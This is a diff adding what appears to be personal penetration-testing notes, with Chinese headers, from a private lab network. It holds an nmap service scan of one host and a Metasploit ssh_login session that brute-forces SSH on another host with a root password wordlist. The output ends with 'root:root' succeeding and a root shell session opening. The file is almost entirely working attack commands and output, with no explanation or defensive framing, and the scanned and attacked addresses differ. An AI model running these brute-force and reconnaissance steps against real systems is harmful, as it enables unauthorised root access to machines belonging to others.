@@ -1,0 +1,40 @@
+
+==查看目标机器信息==
+root@evanpc:~# nmap -sV 192.168.1.97
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-21 11:56 CST
+Nmap scan report for 192.168.1.97
+Host is up (0.00047s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+80/tcp   open  http    nginx 1.8.1
+3306/tcp open  mysql   MySQL 5.6.32-log
+MAC Address: 36:30:39:38:35:37 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
+root@evanpc:~# 
+
+
+
+
+
+
+
+
+==Meterpreter ==
+
+msf auxiliary(ssh_login) > set RHOSTS 192.168.1.199
+RHOSTS => 192.168.1.199
+msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf auxiliary(ssh_login) > set VERBOSE false
+VERBOSE => false
+msf auxiliary(ssh_login) > run 
+
+[*] SSH - Starting bruteforce
+[+] SSH - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux vm.com 2.6.32-642.el6.x86_64 #1 SMP Tue May 10 17:27:01 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
+[*] Command shell session 1 opened (192.168.1.158:35911 -> 192.168.1.199:22) at 2017-03-21 12:07:17 +0800
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
